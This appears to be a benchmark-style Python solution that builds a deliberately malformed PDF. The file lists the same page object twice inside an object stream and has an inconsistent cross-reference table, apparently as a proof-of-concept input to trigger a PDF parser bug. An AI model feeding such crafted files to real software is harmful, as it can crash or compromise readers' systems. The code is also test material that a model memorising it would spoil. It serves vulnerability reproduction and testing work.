class Solution:
    def solve(self, src_path: str) -> bytes:
        page_dict = b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R >>\n'
        len_pd = len(page_dict)
        offset1 = None
        for g1 in range(5, 100):
            g2 = g1 + len_pd
            s1 = str(g1)
            s2 = str(g2)
            computed = 9 + len(s1) + len(s2)
            if computed == g1:
                offset1 = g1
                offset2 = g2
                break
        header = b'4 0 ' + str(offset1).encode() + b' 4 0 ' + str(offset2).encode()
        stream_content = header + page_dict + page_dict
        len_stream = len(stream_content)
        obj3_header = b'3 0 obj\n<< /Type /ObjStm /N 2 /First ' + str(offset1).encode() + b' /Length ' + str(len_stream).encode() + b' >>\nstream\n'
        obj3 = obj3_header + stream_content + b'endstream\nendobj\n'
        parts = []
        positions = {}
        current_pos = 0
        pdf_header = b'%PDF-1.7\n'
        parts.append(pdf_header)
        current_pos += len(pdf_header)
        obj1_start = current_pos
        obj1 = b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'
        parts.append(obj1)
        current_pos += len(obj1)
        positions[1] = obj1_start
        obj2_start = current_pos
        obj2 = b'2 0 obj\n<< /Type /Pages /Kids [4 0 R] /Count 1 >>\nendobj\n'
        parts.append(obj2)
        current_pos += len(obj2)
        positions[2] = obj2_start
        obj3_start = current_pos
        parts.append(obj3)
        current_pos += len(obj3)
        positions[3] = obj3_start
        obj5_start = current_pos
        obj5 = b'5 0 obj\n<< /Length 7 >>\nstream\nBT\nET\nendstream\nendobj\n'
        parts.append(obj5)
        current_pos += len(obj5)
        positions[5] = obj5_start
        xref_start = current_pos
        xref_lines = [b'xref', b'0 6']
        xref_lines.append(b'0000000000 65535 f \n')
        def xref_entry(offset):
            return f'{offset:010d} 00000 n \n'.encode()
        xref_lines.append(xref_entry(positions[1]))
        xref_lines.append(xref_entry(positions[2]))
        xref_lines.append(xref_entry(positions[3]))
        xref_lines.append(b'0000000000 00000 n \n')
        xref_lines.append(xref_entry(positions[5]))
        xref_section = b''.join(xref_lines)
        parts.append(xref_section)
        current_pos += len(xref_section)
        trailer = b'trailer\n<< /Size 6 /Root 1 0 R >>\n'
        parts.append(trailer)
        current_pos += len(trailer)
        startxref = b'startxref\n' + str(xref_start).encode() + b'\n%%EOF\n'
        parts.append(startxref)
        pdf_bytes = b''.join(parts)
        return pdf_bytes
